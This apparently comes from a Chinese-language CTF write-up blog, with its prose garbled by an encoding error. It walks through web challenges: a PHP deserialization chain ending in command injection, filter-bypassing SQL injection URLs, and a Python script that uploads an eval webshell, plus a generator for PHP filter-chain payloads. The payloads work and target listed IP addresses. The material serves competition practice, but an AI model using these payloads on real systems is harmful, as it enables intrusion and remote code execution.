<p>ä»å…¥å£å…ˆåˆ°<code>__destruct()</code>ï¼Œå¾€ä¸‹èµ°åªèƒ½æ˜¯echoè§¦å‘<code>__toString</code>æˆ–è€…<code>$this-&gt;c-&gt;b</code>ï¼Œå¯¹äº<code>$this-&gt;c</code>è§¦å‘<code>__get</code>ï¼Œè¿™é‡Œæ˜¾ç„¶åªæœ‰<code>__get</code>èƒ½ç”¨</p>
<p><img src="/img/wp/2022/2022qgb-5.png"></p>
<p>ä½†æ˜¯è¿›å…¥<code>__get</code>ä¸­åˆ©ç”¨çš„éƒ¨åˆ†éœ€è¦æ¡ä»¶<code>if($this-&gt;flag)</code>ï¼Œæ˜¾ç„¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;flag = False;<br>    &#125;<br></code></pre></td></tr></table></figure>
<p>ä¼šé˜»ç¢è¿™ä¸ªæ¡ä»¶æˆç«‹</p>
<p>ç”±äºé¢˜ç›®ä¸­çš„PHPç‰ˆæœ¬åˆé€‚,å¯ä»¥é‡‡ç”¨ä¿®æ”¹è¶…è¿‡æˆå‘˜æ•°ç›®æ¥ç»•è¿‡<code>wakeup</code></p>
<p>payload:<code>?pop=O:5:&quot;Alice&quot;:1:&#123;s:1:&quot;c&quot;;O:3:&quot;Bob&quot;:2:&#123;s:4:&quot;flag&quot;;b:1;&#125;&#125;</code></p>
<p>è¿›å…¥ä¸‹ä¸€ä¸ªåˆ©ç”¨éƒ¨åˆ†ï¼Œè€ƒå¯Ÿååºåˆ—åŒ–å­—ç¬¦ä¸²æ›¿æ¢æº¢å‡º</p>
<p>åˆ©ç”¨ç‚¹åœ¨</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PingUtils</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ping -c4 $&#123;args[0]&#125;&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>è€Œæ­¤åˆéœ€è¦ä»</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cindy</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$someone</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$phone</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">call</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;phone-&gt;<span class="hljs-title function_ invoke__">call</span>(<span class="hljs-variable">$this</span>-&gt;someone);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>è§¦å‘</p>
<p>ä½†æ˜¯æ­¤å¤„çš„èµ‹å€¼æ˜¯æ— æ³•å®ç°è¿™ä¸ªåŠŸèƒ½çš„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$cindy</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cindy</span>();<br><span class="hljs-variable">$cindy</span>-&gt;someone =  <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;someone&#x27;</span>];<br><span class="hljs-variable">$cindy</span>-&gt;phone = <span class="hljs-string">&quot;p50&quot;</span>;<br></code></pre></td></tr></table></figure>


<p>åˆ©ç”¨ç‚¹åœ¨</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$cindy</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$cindy</span>)));<br></code></pre></td></tr></table></figure>
<p>å…¶ä¸­çš„filterä¼šå¯¹ååºåˆ—åŒ–åçš„å­—ç¬¦ä¸²è¿›è¡Œç‰¹å®šå€¼æ›¿æ¢,ç„¶åå†è§£å‹</p>
<div class="note note-info">
            <p>æ‰€ä»¥å¯ä»¥é€šè¿‡èµ‹å€¼ç‰¹å®šå­—ç¬¦ä¸²è§¦å‘filterä¸­çš„è¿‡æ»¤å®ç°æº¢å‡º,ä»è€Œè¾¾åˆ°åé¢è‡ªPingUtilsç±»åˆ°filterè¿™æ¡é“¾çš„åˆ©ç”¨</p><p>å› ä¸ºåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ä¸­æ˜¯ä¾é ç‰¹å®šä½ç½®çš„æ•°å­—æ¥æ ‡ç¤ºå…¶åçš„å±æ€§å†…å®¹çš„é•¿åº¦,è¿™ä¸ªéç­‰é•¿æ›¿æ¢å°±ä¼šå¯¼è‡´åœ¨ååºåˆ—åŒ–è§£ææ—¶å‡ºç°æ•´ä½“çš„åç§»,åŸæœ¬çš„ä½œä¸ºç»“æ„çš„éƒ¨åˆ†è¢«åç§»åˆ°å±æ€§å†…å®¹çš„éƒ¨åˆ†,å±æ€§å†…å®¹çš„éƒ¨åˆ†å€¼åˆä¼šåç§»è§†ä¸ºç»“æ„çš„éƒ¨åˆ†</p><p>æ„é€ è¶³å¤Ÿå¤šçš„éç­‰é•¿æ›¿æ¢,å°±èƒ½åç§»å‡ºä¸€ä¸ªå®Œæ•´ç»“æ„éƒ¨åˆ†,åœ¨é‡Œé¢å®šä¹‰å‡ºéœ€è¦çš„å±æ€§</p><p>ä¸€ä¸ªåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²å¦‚æœå­˜åœ¨å¤šä½™æ— æ³•æ­£å¸¸è§£æçš„éƒ¨åˆ†,è¿™éƒ¨åˆ†å‰é¢å¦‚æœèƒ½è¢«æ­£å¸¸è§£æ,é‚£ä¹ˆå¤šä½™éƒ¨åˆ†åœ¨è§£ææ—¶ä¼šè¢«æŠ›å¼ƒæ‰ï¼Œæ‰€ä»¥æ„é€ äº§ç”Ÿå¤šä½™æ•°æ®ä¸ç”¨æ‹…å¿ƒï¼Œä¼šè¢«å¿½ç•¥æ‰</p>
          </div>



<p>æ„é€ å‡ºpayload:<br><code>someone=freadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfread|ls  /&quot;;s:5:&quot;phone&quot;;O:9:&quot;PingUtils&quot;:0:&#123;&#125;&#125;</code></p>
<div class="note note-info">
            <p>å¯¹äºpayloadæ¥è¯´ï¼Œåœ¨<code>filter</code>æ›¿æ¢å‰<code>$cindy-&gt;someone</code>å±æ€§çš„å€¼åºåˆ—åŒ–å­—ç¬¦ä¸²è¡¨ç¤ºæ˜¯ <code>s:5:&quot;cindy&quot;;s:224:&quot;PAYLOADSTRING....&quot;</code>è¿™æ ·</p><p>ä½†æ˜¯<code>filter</code>æ›¿æ¢ä¼šæŠŠ<code>fread</code>æ¢æˆ<code>nonono</code>å³é•¿åº¦<code>5</code>çš„å­—ç¬¦ä¸²å˜æˆé•¿åº¦<code>6</code></p><p>ä½†æ­¤æ—¶<code>$cindy-&gt;someone</code>å±æ€§ç”¨æ¥è¡¨ç¤ºå…¶å€¼ è¿™ä¸€å­—ç¬¦ä¸²çš„é•¿åº¦çš„æ•°å­—è¿˜æ˜¯<code>224</code>æ²¡å˜</p><p>ä½†å®é™…ä¸Šæ›¿æ¢åå€¼å­—ç¬¦ä¸²çš„æ€»é•¿åº¦ç”±<code>224</code>å˜æˆäº†<code>224+35</code>(æœ‰35ä¸ªfreadæ›¿æ¢ä¸ºäº†nonono)</p><p>æ‰€ä»¥ååºåˆ—åŒ–åªä¼šå–å€¼å­—ç¬¦ä¸²å‰<code>224</code>ä¸ªå­—ç¬¦ä½œä¸º<code>$cindy-&gt;someone</code>å±æ€§ååºåˆ—åŒ–åçš„å€¼</p><p>å‰©ä¸‹<code>35</code>åˆ™ä¼šè¢«å½“æˆååºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­çš„ç»“æ„éƒ¨åˆ†æ¯è§£æ</p><p>å³åœ¨PHPçœ‹æ¥æ•´ä¸ªå­—ç¬¦ä¸²æ˜¯è¿™æ ·çš„<code>&quot;cindy&quot;;s:224:&quot;AfterPayloadString...&quot;;s:5:&quot;phone&quot;;O:9:&quot;PingUtils&quot;:0:{}}</code></p><p>åœ¨<code>cindy</code>å±æ€§åé¢è¿˜æœ‰ä¸€ä¸ªå±æ€§<code>phone</code>,å…¶å€¼æ˜¯ä¸ªåä¸º<code>PingUtils</code>çš„å¯¹è±¡</p><p>æ³¨æ„æœ€æœ«å°¾çš„<code>}</code>.è¿™ä¸ªå°†äºæ•´ä¸ªååºåˆ—åŒ–å­—ç¬¦ä¸²å¼€å§‹çš„<code>{</code>é—­åˆ,PHPå°†æŠŠè¿™ä¸ªçœ‹ä½œååºåˆ—åŒ–å­—ç¬¦ä¸²çš„ç»“å°¾</p><p>åªæœ‰åé¢çš„å†…å®¹ç”±äºç»“æ„ä¸å®Œæ•´PHPå¹¶ä¸ä¼šè§£æ,è€Œæ˜¯ç›´æ¥æŠ›å¼ƒå¹¶ä¸”ä¸ä¼šäº§ç”Ÿä»»ä½•æŠ¥é”™</p>
          </div>


<p>è¯»å–flagï¼š<br><code>?pop=O:5:&quot;Alice&quot;:1:&#123;s:1:&quot;c&quot;;O:3:&quot;Bob&quot;:2:&#123;s:4:&quot;flag&quot;;b:1;&#125;&#125;&amp;someone=freadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfread|nl /*&quot;;s:5:&quot;phone&quot;;O:9:&quot;PingUtils&quot;:0:&#123;&#125;&#125;</code></p>
<h2 id="file-sql-new"><a href="#file-sql-new" class="headerlink" title="file_sql_new"></a>file_sql_new</h2><p><em>èµ›åå¤ç°</em></p>
<p>sqlæ³¨å…¥ï¼Œè¿‡æ»¤äº†ä¸€æ¬¡select</p>
<p>åŒå†™selectç»•è¿‡</p>
<p>payloadï¼š</p>
<p><code>http://39.107.71.45:65441/index.php?id=-1%27union%20seleselectct%201,(seselectlect(group_concat(table_name))from(information_schema.tables)where((table_schema)=(database()))),3%23</code></p>
<p><img src="/img/wp/2022/2022qgb-6.png"></p>
<p><code>http://39.107.71.45:65441/index.php?id=-1%27union%20seleselectct%201,(selselectect(group_concat(column_name))from(information_schema.columns)where((table_name)=(%27fl4g%27))),3%23</code></p>
<p><img src="/img/wp/2022/2022qgb-7.png"></p>
<p><code>http://39.107.71.45:65441/index.php?id=-1%27union%20seleselectct%201,(seselectlect(fllllag)from(fl4g)),3%23</code></p>
<p><img src="/img/wp/2022/2022qgb-8.png"></p>
<p><code>http://39.107.71.45:65441/index.php?id=-1%27union%20seleselectct%201,(seleselectct(hex(load_file(%22/var/www/html/flag.php%22)))),3%23</code></p>
<p><img src="/img/wp/2022/2022qgb-9.png"></p>
<p>å¾—åˆ°<code>3C3F7068700A0A24666C6167203D207B6C69726768793864757370717A6A6631623735636E6561773330343974766D787D3B0A6563686F20226161223B0A3F3E0A</code>ï¼Œè½¬å­—ç¬¦ä¸²å³å¯å¾—åˆ°flag</p>
<h2 id="ezweb-new"><a href="#ezweb-new" class="headerlink" title="ezweb_new"></a>ezweb_new</h2><p><em>èµ›åå¤ç°</em></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$_</span>=@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;â€®imaohw?â¦â©â¦whoami&#x27;</span>];<span class="hljs-comment">//</span><br>    <span class="hljs-variable">$__</span>=<span class="hljs-string">&quot;/var/www/html&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_</span> &amp;&amp; @<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-variable">$_</span>)[<span class="hljs-number">0</span>],<span class="hljs-number">0</span>,<span class="hljs-number">6</span>) === <span class="hljs-string">&#x27;@&lt;?php&#x27;</span>)&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_</span>);<br>    &#125;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>        <span class="hljs-variable">$$key</span> = <span class="hljs-variable">$value</span>;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-variable">$__</span>));<br></code></pre></td></tr></table></figure>


<p>ä¸Šæ¥æœ‰ä¸ªå°é™·é˜±ï¼Œåœ¨ä¼ å‚çš„åœ°æ–¹ï¼Œç”¨é¼ æ ‡é€‰ï¼Œä¼šå‘ç°æ³¨é‡Šå¤„å·¦å³çš„å­—ç¬¦ä¸²ä¸å—ä½ æ§åˆ¶ï¼Œè¿™é‡Œè€ƒçš„å°±æ˜¯<code>unicode</code>å­—ç¬¦ä¸²äº†</p>
<p>å½“å¤åˆ¶ä»£ç è¿›æŸäº›ç¼–è¾‘å™¨ä¸­å¯ä»¥çœ‹åˆ°è¯†åˆ«åˆ°äº†ä¸€äº›<code>Unicode</code>å­—ç¬¦ä¸²,å‚æ•°å¾ˆæ˜æ˜¾ä¸æ˜¯<code>whoami</code>äº†<br><img src="/img/wp/2022/2022qgb-10.png"></p>
<p>å°†<code>[U+202E]</code>ç­‰è¿›è¡ŒUrlç¼–ç ï¼Œå¾—åˆ°<code>%E2%80%AEimaohw?%E2%81%A6%E2%81%A9%E2%81%A6whoami</code></p>
<p>ç»§ç»­å¾€ä¸‹çœ‹ï¼Œå¯ä»¥æœ‰ä¸¤ç§æ–¹æ³•åš</p>
<p>æ–¹æ³•ä¸€ï¼š<br>PHPå´©æºƒgetshell</p>
<p>ä½¿phpå´©æºƒåä¿ç•™ä¸‹ä¸´æ—¶æ–‡ä»¶ï¼Œç„¶ååˆ©ç”¨<code>scandir</code>æŸ¥æ–‡ä»¶åï¼Œæœ€ååŒ…å«è¾¾åˆ°getshell</p>
<p>å†™é©¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://82.157.177.192:46728/?%E2%80%AEimaohw%3F%E2%81%A6%E2%81%A9%E2%81%A6whoami=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span><br>paramsMultipart = [(<span class="hljs-string">&#x27;file&#x27;</span>, (<span class="hljs-string">&#x27;a.php&#x27;</span>, <span class="hljs-string">&quot;@&lt;?php\r\neval(\x24_POST[&#x27;a&#x27;]);\r\necho 123;\r\n?&gt;&quot;</span>, <span class="hljs-string">&#x27;application/octet-stream&#x27;</span>))]<br><br>requests.post(url,files=paramsMultipart)<br></code></pre></td></tr></table></figure>

<p>æŸ¥æ–‡ä»¶åï¼š<br><code>http://82.157.177.192:46728/?%E2%80%AEimaohw?%E2%81%A6%E2%81%A9%E2%81%A6whoami=1&amp;__=/tmp/</code></p>
<p><img src="/img/wp/2022/2022qgb-11.png"></p>
<p>getshellï¼š<br><code>http://82.157.177.192:46728/??%E2%80%AEimaohw?%E2%81%A6%E2%81%A9%E2%81%A6whoami=/tmp/phpsxtpjV</code></p>
<p><img src="/img/wp/2022/2022qgb-12.png"></p>
<p>æ–¹æ³•äºŒï¼š<br>filteræ„é€ ä¸€å¥è¯rce</p>
<p><a href="https://blog.csdn.net/rfrder/article/details/122326155">åŸç†å‚è€ƒ1</a><br><a href="https://tttang.com/archive/1395/">åŸç†å‚è€ƒ2</a></p>
<p><a href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT">é¡¹ç›®åœ°å€</a></p>
<p>å¸ˆå‚…ä»¬å¦‚æœç”Ÿæˆå‡ºæ¥çš„payloadä¸èƒ½ç”¨çš„è¯å¯ä»¥è¯•è¯•åˆ‡æ¢ç³»ç»Ÿï¼Œæ¯”å¦‚ç”¨ubuntuæˆ–è€…kaliæˆ–è€…debianè¯•è¯•ï¼ˆä¸è¦ç”¨windowsï¼Œå› ä¸ºåœ¨windowsä¸‹æ–‡ä»¶åä¸åŒºåˆ†å¤§å°å†™ï¼‰ï¼Œè¿˜æœ‰phpç‰ˆæœ¬å°½é‡è·Ÿé¢˜ç›®ä¿æŒä¸€è‡´ï¼Œå¦åˆ™æœåŠ¡å™¨ä¸Šçš„iconvé»˜è®¤æ”¯æŒå’Œé¶æœºä¸ä¸€æ ·ï¼Œå°±ä¼šæ— æ•ˆã€‚è¦æ˜¯è¿˜ä¸è¡Œå°±è¯•è¯•é¡¹ç›®ä¸­çš„fuzzer.phpï¼Œé‡æ–°æ„é€ ä¸‹(æˆ‘æ„é€ è¿™ä¸ªèŠ±äº†ä¸€å¤©çš„æ—¶é—´ï¼Œå‘œå‘œå‘œ)</p>
<p>æˆ‘çš„poc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">file_to_use = <span class="hljs-string">&quot;/etc/passwd&quot;</span><br><br><span class="hljs-comment">#@&lt;?php eval($_POST[2]);;?&gt;</span><br>base64_payload = <span class="hljs-string">&quot;QDw/cGhwIGV2YWwoJF9QT1NUWzJdKTs7Pz4K&quot;</span><br><br><span class="hljs-comment"># generate some garbage base64</span><br>filters = <span class="hljs-string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span><br>filters += <span class="hljs-string">&quot;convert.base64-encode|&quot;</span><br><span class="hljs-comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span><br>filters += <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span><br><br><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> base64_payload[::-<span class="hljs-number">1</span>]:<br>        <span class="hljs-keyword">if</span>(c==<span class="hljs-string">&quot;/&quot;</span>):<br>            c=<span class="hljs-string">&quot;%2f&quot;</span><br>        filters += <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./res/&#x27;</span>+c).read() + <span class="hljs-string">&quot;|&quot;</span><br>        <span class="hljs-comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span><br>        filters += <span class="hljs-string">&quot;convert.base64-decode|&quot;</span><br>        filters += <span class="hljs-string">&quot;convert.base64-encode|&quot;</span><br>        <span class="hljs-comment"># get rid of equal signs</span><br>        filters += <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span><br><br>filters += <span class="hljs-string">&quot;convert.base64-decode&quot;</span><br><br>final_payload = <span class="hljs-string">f&quot;php://filter/<span class="hljs-subst">&#123;filters&#125;</span>/resource=<span class="hljs-subst">&#123;file_to_use&#125;</span>&quot;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-string">&#x27;&lt;?php echo file_get_contents(&quot;&#x27;</span>+final_payload+<span class="hljs-string">&#x27;&quot;);?&gt;&#x27;</span>)<br><span class="hljs-built_in">print</span>(final_payload)<br></code></pre></td></tr></table></figure>



<div class="note note-info">
            <p><a href="http://47.94.151.201:31863/?%E2%80%AEimaohw?%E2%81%A6%E2%81%A9%E2%81%A6whoami=php://filter/convert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP866.CSUNICODE%7Cconvert.iconv.CSISOLATIN5.ISO_6937-2%7Cconvert.iconv.CP950.UTF-16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.865.UTF16%7Cconvert.iconv.CP901.ISO6937%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.iconv.ISO-IR-103.850%7Cconvert.iconv.PT154.UCS4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.iconv.CSA_T500.L4%7Cconvert.iconv.ISO_8859-2.ISO-IR-103%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.GBK.BIG5%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UNICODE%7Cconvert.iconv.ISIRI3342.UCS4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.865.UTF16%7Cconvert.iconv.CP901.ISO6937%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP869.UTF-32%7Cconvert.iconv.MACUK.UCS4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.ISO88597.UTF16%7Cconvert.iconv.RK1048.UCS-4LE%7Cconvert.iconv.UTF32.CP1167%7Cconvert.iconv.CP9066.CSUCS4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.iconv.CSA_T500.L4%7Cconvert.iconv.ISO_8859-2.ISO-IR-103%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.iconv.CSA_T500-1983.UCS-2BE%7Cconvert.iconv.MIK.UCS2%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.CP950.SHIFT_JISX0213%7Cconvert.iconv.UHC.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UNICODE%7Cconvert.iconv.ISIRI3342.UCS4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.JS.UNICODE%7Cconvert.iconv.L4.UCS2%7Cconvert.iconv.UCS-4LE.OSF05010001%7Cconvert.iconv.IBM912.UTF-16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP367.UTF-16%7Cconvert.iconv.CSIBM901.SHIFT_JISX0213%7Cconvert.iconv.UHC.CP1361%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.CP949.UTF32BE%7Cconvert.iconv.ISO_69372.CSIBM921%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP861.UTF-16%7Cconvert.iconv.L4.GB13000%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSGB2312.UTF-32%7Cconvert.iconv.IBM-1161.IBM932%7Cconvert.iconv.GB13000.UTF16BE%7Cconvert.iconv.864.UTF-32LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L4.UTF32%7Cconvert.iconv.CP1250.UCS-2%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.iconv.CSA_T500-1983.UCS-2BE%7Cconvert.iconv.MIK.UCS2%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode/resource=/etc/passwd">http://47.94.151.201:31863/?%E2%80%AEimaohw?%E2%81%A6%E2%81%A9%E2%81%A6whoami=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|co